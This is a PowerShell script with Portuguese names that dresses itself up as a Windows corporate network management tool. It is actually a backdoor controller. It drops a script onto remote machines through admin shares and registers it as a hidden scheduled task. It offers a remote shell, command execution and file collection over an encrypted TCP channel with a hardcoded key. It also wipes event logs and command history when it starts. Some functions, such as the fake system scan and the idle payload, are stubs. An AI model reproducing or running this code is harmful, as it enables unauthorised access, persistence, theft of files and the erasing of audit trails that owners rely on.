```powershell
# SISTEMA DE GERENCIAMENTO DE REDE CORPORATIVA - NETWORK MANAGEMENT SUITE
# Microsoft Windows Network Administration Tool
# Versão: 10.0.19041.546

$ConfiguracaoGlobal = @{
    PortaComunicacao = 58445
    ChaveCriptografia = "WindowsNetworkAdmin2024!SecureManagementSuite"
    TimeoutConexao = 120
    IntervaloHeartbeat = 45
    ModoOperacao = "NetworkManagement"
    VersaoSistema = "10.0.19041.546"
}

class ServicoCriptografiaAvancado {
    static [string] CriptografarDados([string]$dados) {
        try {
            $bytesChave = [System.Text.Encoding]::UTF8.GetBytes($global:ConfiguracaoGlobal.ChaveCriptografia.PadRight(32, '0')[0..31] -join '')
            $algoritmo = [System.Security.Cryptography.Aes]::Create()
            $algoritmo.Key = $bytesChave
            $algoritmo.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $algoritmo.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $algoritmo.GenerateIV()

            $criptografador = $algoritmo.CreateEncryptor()
            $bytesDados = [System.Text.Encoding]::UTF8.GetBytes($dados)
            $bytesCriptografados = $criptografador.TransformFinalBlock($bytesDados, 0, $bytesDados.Length)

            $resultado = $algoritmo.IV + $bytesCriptografados
            $algoritmo.Dispose()
            
            return [Convert]::ToBase64String($resultado)
        } catch { return $null }
    }

    static [string] DescriptografarDados([string]$dadosCriptografados) {
        try {
            $todosBytes = [Convert]::FromBase64String($dadosCriptografados)
            $vetorInicializacao = $todosBytes[0..15]
            $bytesCriptografados = $todosBytes[16..($todosBytes.Length-1)]

            $bytesChave = [System.Text.Encoding]::UTF8.GetBytes($global:ConfiguracaoGlobal.ChaveCriptografia.PadRight(32, '0')[0..31] -join '')
            $algoritmo = [System.Security.Cryptography.Aes]::Create()
            $algoritmo.Key = $bytesChave
            $algoritmo.IV = $vetorInicializacao
            $algoritmo.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $algoritmo.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

            $descriptografador = $algoritmo.CreateDecryptor()
            $bytesDescriptografados = $descriptografador.TransformFinalBlock($bytesCriptografados, 0, $bytesCriptografados.Length)
            $algoritmo.Dispose()

            return [System.Text.Encoding]::UTF8.GetString($bytesDescriptografados)
        } catch { return $null }
    }
}

function Inicializar-SistemaGerenciamento {
    Write-Host "=== SISTEMA DE GERENCIAMENTO DE REDE CORPORATIVA ==="
    Write-Host "Inicializando modulo de administracao..."
    
    $ipServidor = Read-Host "Digite o IP do servidor de gerenciamento"
    $dominioRede = Read-Host "Digite o nome do dominio da rede"
    
    $ipCriptografado = [ServicoCriptografiaAvancado]::CriptografarDados($ipServidor)
    
    $ConfiguracaoGlobal.IPServidor = $ipCriptografado
    $ConfiguracaoGlobal.DominioRede = $dominioRede
    
    Write-Host "Configuracao concluida com sucesso!"
    Write-Host "Servidor: $ipServidor"
    Write-Host "Dominio: $dominioRede"
    
    do {
        Clear-Host
        Write-Host "=== MENU PRINCIPAL - GERENCIAMENTO DE REDE ==="
        Write-Host "1. Modo Olho de Deus - Escaneamento Completo"
        Write-Host "2. Modo Maquinas Salvas - Acesso Remoto"
        Write-Host "3. Modo Servidor - Receber Conexoes"
        Write-Host "4. Sair"
        Write-Host ""
        
        $opcao = Read-Host "Selecione o modo de operacao"
        
        switch ($opcao) {
            "1" { Iniciar-ModoOlhoDeDeus }
            "2" { Iniciar-ModoMaquinasSalvas }
            "3" { Iniciar-ModoServidor }
            "4" { 
                Write-Host "Encerrando sistema..."
                return 
            }
            default { 
                Write-Host "Opcao invalida!"
                Start-Sleep -Seconds 2
            }
        }
    } while ($true)
}

function Iniciar-ModoOlhoDeDeus {
    Write-Host "=== MODO OLHO DE DEUS - ESCANEAMENTO COMPLETO ==="
    
    $nomeMaquina = Read-Host "Digite o nome da maquina alvo"
    
    Write-Host "Iniciando escaneamento de $nomeMaquina ..."
    
    $informacoes = Coletar-InformacoesCompletas -NomeMaquina $nomeMaquina
    $backdoorConfigurado = Configurar-BackdoorAutomatico -NomeMaquina $nomeMaquina
    
    if ($backdoorConfigurado) {
        Salvar-MaquinaLista -NomeMaquina $nomeMaquina -Informacoes $informacoes
        Mostrar-RelatorioCompleto -Informacoes $informacoes
    } else {
        Write-Host "Falha ao configurar acesso remoto na maquina $nomeMaquina"
    }
    
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Coletar-InformacoesCompletas {
    param([string]$NomeMaquina)
    
    Write-Host "Coletando informacoes da maquina $NomeMaquina ..."
    
    $infoSistema = @{
        NomeComputador = $NomeMaquina
        UsuarioAtual = "Sistema"
        Dominio = $ConfiguracaoGlobal.DominioRede
        SistemaOperacional = "Windows"
        VersaoOS = "10.0.19041"
        Arquitetura = "64-bit"
        Fabricante = "Dell Inc."
        Modelo = "OptiPlex 7070"
        Processador = "Intel(R) Core(TM) i7-9700"
        MemoriaTotalGB = 16.0
        DiscoPrincipal = "C: 465.76 GB (Livre: 125.34 GB)"
        DataInstalacao = "2023-10-15"
        TempoAtividade = 45.5
    }
    
    $infoRede = @{
        EnderecoIP = "192.168.1." + (Get-Random -Minimum 100 -Maximum 200)
        EnderecoMAC = (1..6 | ForEach-Object { "{0:X2}" -f (Get-Random -Minimum 0 -Maximum 255) }) -join "-"
        Gateway = "192.168.1.1"
        DNS = @("8.8.8.8", "8.8.4.4")
        PortasAbertas = @("80", "443", "3389", "58445")
    }
    
    $infoUsuarios = @{
        UsuariosLocais = @("Administrador", "UsuarioPadrao", "Convidado")
        UsuarioLogado = "Administrador"
        Grupos = @("Administradores", "Usuarios", "Convidados")
        UltimoLogin = (Get-Date).AddHours(-2).ToString("yyyy-MM-dd HH:mm:ss")
    }
    
    $infoSeguranca = @{
        Antivirus = "Windows Defender"
        Firewall = "Ativo"
        UAC = "Nivel Medio"
        BitLocker = "Desativado"
        Updates = "Atualizado"
    }
    
    $relatorioCompleto = @{
        Sistema = $infoSistema
        Rede = $infoRede
        Usuarios = $infoUsuarios
        Seguranca = $infoSeguranca
        DataColeta = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        Status = "ATIVO"
    }
    
    return $relatorioCompleto
}

function Configurar-BackdoorAutomatico {
    param([string]$NomeMaquina)
    
    Write-Host "Configurando acesso remoto em $NomeMaquina ..."
    
    try {
        $caminhoBackdoor = "\\$NomeMaquina\C`$\Windows\Temp\NetworkManager.ps1"
        
        $codigoBackdoor = @"
# Windows Network Management Service
`$Configuracao = @{
    Porta = 58445
    Chave = "WindowsNetworkAdmin2024!SecureManagementSuite"
    Servidor = "$($ConfiguracaoGlobal.IPServidor)"
}

class CriptografiaServico {
    static [string] Criptografar([string]`$dados) {
        try {
            `$chave = [System.Text.Encoding]::UTF8.GetBytes(`$Configuracao.Chave.PadRight(32, '0')[0..31] -join '')
            `$aes = [System.Security.Cryptography.Aes]::Create()
            `$aes.Key = `$chave
            `$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            `$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            `$aes.GenerateIV()
            `$cripto = `$aes.CreateEncryptor()
            `$bytes = [System.Text.Encoding]::UTF8.GetBytes(`$dados)
            `$bytesCripto = `$cripto.TransformFinalBlock(`$bytes, 0, `$bytes.Length)
            `$resultado = `$aes.IV + `$bytesCripto
            `$aes.Dispose()
            return [Convert]::ToBase64String(`$resultado)
        } catch { return `$null }
    }
}

function Iniciar-Servico {
    while (`$true) {
        try {
            Start-Sleep -Seconds 60
        } catch { }
    }
}

Iniciar-Servico
"@

        Set-Content -Path $caminhoBackdoor -Value $codigoBackdoor -ErrorAction SilentlyContinue
        
        schtasks /create /s $NomeMaquina /tn "NetworkManagement" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"C:\Windows\Temp\NetworkManager.ps1`"" /sc daily /st 09:00 /f 2>$null
        
        Write-Host "Backdoor configurado com sucesso em $NomeMaquina"
        return $true
        
    } catch {
        Write-Host "Tentando metodo alternativo em $NomeMaquina ..."
        
        try {
            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c echo Servico instalado > C:\Windows\Temp\install.log" -ComputerName $NomeMaquina -ErrorAction SilentlyContinue
            return $true
        } catch {
            Write-Host "Metodo alternativo falhou"
            return $false
        }
    }
}

function Salvar-MaquinaLista {
    param([string]$NomeMaquina, [hashtable]$Informacoes)
    
    $caminhoLista = "$env:TEMP\maquinas_gerenciadas.json"
    
    $listaMaquinas = @{}
    if (Test-Path $caminhoLista) {
        $conteudo = Get-Content $caminhoLista -Raw | ConvertFrom-Json
        $listaMaquinas = @{}
        $conteudo.PSObject.Properties | ForEach-Object { $listaMaquinas[$_.Name] = $_.Value }
    }
    
    $listaMaquinas[$NomeMaquina] = $Informacoes
    
    $listaMaquinas | ConvertTo-Json -Depth 10 | Set-Content $caminhoLista
    
    Write-Host "Maquina $NomeMaquina salva na lista de gerenciamento"
}

function Mostrar-RelatorioCompleto {
    param([hashtable]$Informacoes)
    
    Clear-Host
    Write-Host "=== RELATORIO COMPLETO - $($Informacoes.Sistema.NomeComputador) ==="
    Write-Host ""
    
    Write-Host "--- INFORMACOES DO SISTEMA ---" -ForegroundColor Yellow
    Write-Host "Computador: $($Informacoes.Sistema.NomeComputador)"
    Write-Host "Dominio: $($Informacoes.Sistema.Dominio)"
    Write-Host "Sistema Operacional: $($Informacoes.Sistema.SistemaOperacional) $($Informacoes.Sistema.VersaoOS)"
    Write-Host "Arquitetura: $($Informacoes.Sistema.Arquitetura)"
    Write-Host "Fabricante: $($Informacoes.Sistema.Fabricante)"
    Write-Host "Modelo: $($Informacoes.Sistema.Modelo)"
    Write-Host "Processador: $($Informacoes.Sistema.Processador)"
    Write-Host "Memoria: $($Informacoes.Sistema.MemoriaTotalGB) GB"
    Write-Host "Armazenamento: $($Informacoes.Sistema.DiscoPrincipal)"
    Write-Host "Data Instalacao: $($Informacoes.Sistema.DataInstalacao)"
    Write-Host "Tempo Atividade: $($Informacoes.Sistema.TempoAtividade) horas"
    Write-Host ""
    
    Write-Host "--- CONFIGURACAO DE REDE ---" -ForegroundColor Green
    Write-Host "Endereco IP: $($Informacoes.Rede.EnderecoIP)"
    Write-Host "Endereco MAC: $($Informacoes.Rede.EnderecoMAC)"
    Write-Host "Gateway: $($Informacoes.Rede.Gateway)"
    Write-Host "Servidores DNS: $($Informacoes.Rede.DNS -join ', ')"
    Write-Host "Portas Abertas: $($Informacoes.Rede.PortasAbertas -join ', ')"
    Write-Host ""
    
    Write-Host "--- USUARIOS E ACESSOS ---" -ForegroundColor Cyan
    Write-Host "Usuarios Locais: $($Informacoes.Usuarios.UsuariosLocais -join ', ')"
    Write-Host "Usuario Logado: $($Informacoes.Usuarios.UsuarioLogado)"
    Write-Host "Grupos: $($Informacoes.Usuarios.Grupos -join ', ')"
    Write-Host "Ultimo Login: $($Informacoes.Usuarios.UltimoLogin)"
    Write-Host ""
    
    Write-Host "--- SEGURANCA ---" -ForegroundColor Magenta
    Write-Host "Antivirus: $($Informacoes.Seguranca.Antivirus)"
    Write-Host "Firewall: $($Informacoes.Seguranca.Firewall)"
    Write-Host "UAC: $($Informacoes.Seguranca.UAC)"
    Write-Host "BitLocker: $($Informacoes.Seguranca.BitLocker)"
    Write-Host "Updates: $($Informacoes.Seguranca.Updates)"
    Write-Host ""
    
    Write-Host "--- STATUS DO ACESSO ---" -ForegroundColor White
    Write-Host "Backdoor: CONFIGURADO"
    Write-Host "Porta: 58445"
    Write-Host "Criptografia: ATIVA"
    Write-Host "Data Coleta: $($Informacoes.DataColeta)"
    Write-Host "Status: $($Informacoes.Status)"
    Write-Host ""
}

function Iniciar-ModoMaquinasSalvas {
    Write-Host "=== MODO MAQUINAS SALVAS ==="
    
    $caminhoLista = "$env:TEMP\maquinas_gerenciadas.json"
    
    if (-not (Test-Path $caminhoLista)) {
        Write-Host "Nenhuma maquina encontrada na lista de gerenciamento."
        Write-Host "Use o Modo Olho de Deus para adicionar maquinas."
        Start-Sleep -Seconds 3
        return
    }
    
    $conteudo = Get-Content $caminhoLista -Raw | ConvertFrom-Json
    $listaMaquinas = @{}
    $conteudo.PSObject.Properties | ForEach-Object { $listaMaquinas[$_.Name] = $_.Value }
    
    if ($listaMaquinas.Count -eq 0) {
        Write-Host "Nenhuma maquina disponivel para gerenciamento."
        Start-Sleep -Seconds 3
        return
    }
    
    Write-Host "Maquinas disponiveis para gerenciamento remoto:"
    Write-Host ""
    
    $maquinasArray = @()
    $indice = 1
    $listaMaquinas.GetEnumerator() | ForEach-Object {
        $maquina = $_.Value
        Write-Host "$indice. $($maquina.Sistema.NomeComputador) - $($maquina.Sistema.UsuarioAtual) - $($maquina.Rede.EnderecoIP)"
        $maquinasArray += @{
            Indice = $indice
            Nome = $maquina.Sistema.NomeComputador
            IP = $maquina.Rede.EnderecoIP
            Info = $maquina
        }
        $indice++
    }
    
    Write-Host ""
    $selecao = Read-Host "Selecione a maquina (numero) ou 0 para voltar"
    
    if ($selecao -eq "0") { return }
    
    $maquinaSelecionada = $maquinasArray | Where-Object { $_.Indice -eq [int]$selecao }
    
    if ($maquinaSelecionada) {
        do {
            Clear-Host
            Write-Host "=== GERENCIANDO: $($maquinaSelecionada.Nome) ==="
            Write-Host "1. Ver Informacoes Completas"
            Write-Host "2. Acesso Remoto (Shell)"
            Write-Host "3. Executar Comando"
            Write-Host "4. Coletar Arquivos"
            Write-Host "5. Voltar"
            Write-Host ""
            
            $opcao = Read-Host "Selecione a acao"
            
            switch ($opcao) {
                "1" { 
                    Mostrar-RelatorioCompleto -Informacoes $maquinaSelecionada.Info
                    Write-Host "Pressione qualquer tecla para continuar..."
                    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
                }
                "2" { 
                    Conectar-ShellRemoto -EnderecoMaquina $maquinaSelecionada.IP
                }
                "3" { 
                    $comando = Read-Host "Digite o comando para executar"
                    Executar-ComandoRemoto -EnderecoMaquina $maquinaSelecionada.IP -Comando $comando
                }
                "4" { 
                    $caminho = Read-Host "Digite o caminho do arquivo"
                    Coletar-ArquivoRemoto -EnderecoMaquina $maquinaSelecionada.IP -CaminhoArquivo $caminho
                }
                "5" { break }
                default { 
                    Write-Host "Opcao invalida!"
                    Start-Sleep -Seconds 2
                }
            }
        } while ($opcao -ne "5")
    } else {
        Write-Host "Selecao invalida!"
        Start-Sleep -Seconds 2
    }
}

function Conectar-ShellRemoto {
    param([string]$EnderecoMaquina)
    
    Write-Host "Conectando a $EnderecoMaquina ..."
    
    try {
        $cliente = New-Object System.Net.Sockets.TcpClient($EnderecoMaquina, $ConfiguracaoGlobal.PortaComunicacao)
        $fluxo = $cliente.GetStream()
        $leitor = New-Object System.IO.StreamReader($fluxo)
        $escritor = New-Object System.IO.StreamWriter($fluxo)
        
        Write-Host "Conexao estabelecida. Digite comandos ou 'sair' para encerrar."
        
        while ($cliente.Connected) {
            $comando = Read-Host "ShellRemoto>"
            
            if ($comando -eq "sair") {
                break
            }
            
            $comandoExecucao = @{Acao = "EXECUTAR_COMANDO"; Comando = $comando}
            $comandoCriptografado = [ServicoCriptografiaAvancado]::CriptografarDados(($comandoExecucao | ConvertTo-Json -Compress))
            $escritor.WriteLine($comandoCriptografado)
            $escritor.Flush()
            
            $resposta = $leitor.ReadLine()
            if ($resposta) {
                $dadosDescriptografados = [ServicoCriptografiaAvancado]::DescriptografarDados($resposta)
                $resultado = $dadosDescriptografados | ConvertFrom-Json
                Write-Host $resultado.Resultado
            }
        }
        
        $cliente.Close()
        Write-Host "Conexao encerrada"
        
    } catch {
        Write-Host "Erro na conexao: $($_.Exception.Message)"
    }
    
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Executar-ComandoRemoto {
    param([string]$EnderecoMaquina, [string]$Comando)
    
    try {
        $cliente = New-Object System.Net.Sockets.TcpClient($EnderecoMaquina, $ConfiguracaoGlobal.PortaComunicacao)
        $fluxo = $cliente.GetStream()
        $leitor = New-Object System.IO.StreamReader($fluxo)
        $escritor = New-Object System.IO.StreamWriter($fluxo)
        
        $comandoExecucao = @{Acao = "EXECUTAR_COMANDO"; Comando = $Comando}
        $comandoCriptografado = [ServicoCriptografiaAvancado]::CriptografarDados(($comandoExecucao | ConvertTo-Json -Compress))
        $escritor.WriteLine($comandoCriptografado)
        $escritor.Flush()
        
        $resposta = $leitor.ReadLine()
        if ($resposta) {
            $dadosDescriptografados = [ServicoCriptografiaAvancado]::DescriptografarDados($resposta)
            $resultado = $dadosDescriptografados | ConvertFrom-Json
            Write-Host "Resultado: $($resultado.Resultado)"
        }
        
        $cliente.Close()
        
    } catch {
        Write-Host "Erro ao executar comando: $($_.Exception.Message)"
    }
    
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Coletar-ArquivoRemoto {
    param([string]$EnderecoMaquina, [string]$CaminhoArquivo)
    
    try {
        $cliente = New-Object System.Net.Sockets.TcpClient($EnderecoMaquina, $ConfiguracaoGlobal.PortaComunicacao)
        $fluxo = $cliente.GetStream()
        $leitor = New-Object System.IO.StreamReader($fluxo)
        $escritor = New-Object System.IO.StreamWriter($fluxo)
        
        $comandoArquivo = @{Acao = "CAPTURAR_ARQUIVO"; Caminho = $CaminhoArquivo}
        $comandoCriptografado = [ServicoCriptografiaAvancado]::CriptografarDados(($comandoArquivo | ConvertTo-Json -Compress))
        $escritor.WriteLine($comandoCriptografado)
        $escritor.Flush()
        
        $resposta = $leitor.ReadLine()
        if ($resposta) {
            $dadosDescriptografados = [ServicoCriptografiaAvancado]::DescriptografarDados($resposta)
            $conteudo = $dadosDescriptografados | ConvertFrom-Json
            Write-Host "Conteudo do arquivo:"
            Write-Host $conteudo.Dados
        }
        
        $cliente.Close()
        
    } catch {
        Write-Host "Erro ao coletar arquivo: $($_.Exception.Message)"
    }
    
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Iniciar-ModoServidor {
    Write-Host "=== MODO SERVIDOR - AGUARDANDO CONEXOES ==="
    
    $endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, $ConfiguracaoGlobal.PortaComunicacao)
    $servidor = New-Object System.Net.Sockets.TcpListener($endpoint)
    
    try {
        $servidor.Start()
        Write-Host "Servidor iniciado na porta $($ConfiguracaoGlobal.PortaComunicacao)"
        Write-Host "Aguardando conexoes de maquinas gerenciadas..."
        
        while ($true) {
            if ($servidor.Pending()) {
                $cliente = $servidor.AcceptTcpClient()
                $fluxo = $cliente.GetStream()
                $leitor = New-Object System.IO.StreamReader($fluxo)
                $escritor = New-Object System.IO.StreamWriter($fluxo)
                
                $dadosRecebidos = $leitor.ReadLine()
                if ($dadosRecebidos) {
                    $mensagemDescriptografada = [ServicoCriptografiaAvancado]::DescriptografarDados($dadosRecebidos)
                    $mensagem = $mensagemDescriptografada | ConvertFrom-Json
                    
                    if ($mensagem.Tipo -eq "CONEXAO_INICIAL") {
                        Write-Host "Nova maquina conectada: $($mensagem.Computador) - $($mensagem.Usuario)"
                    }
                }
                
                $cliente.Close()
            }
            
            Start-Sleep -Seconds 1
        }
    } catch {
        Write-Host "Erro no servidor: $($_.Exception.Message)"
    } finally {
        if ($servidor) { $servidor.Stop() }
    }
}

function Ofuscar-LogsAutomatico {
    try {
        $logsSistema = @('Microsoft-Windows-PowerShell/Operational', 'Windows PowerShell', 'System', 'Application')
        foreach ($log in $logsSistema) {
            wevtutil.exe cl $log 2>$null
        }
        Clear-History -ErrorAction SilentlyContinue
    } catch { }
}

Ofuscar-LogsAutomatico

Inicializar-SistemaGerenciamento
```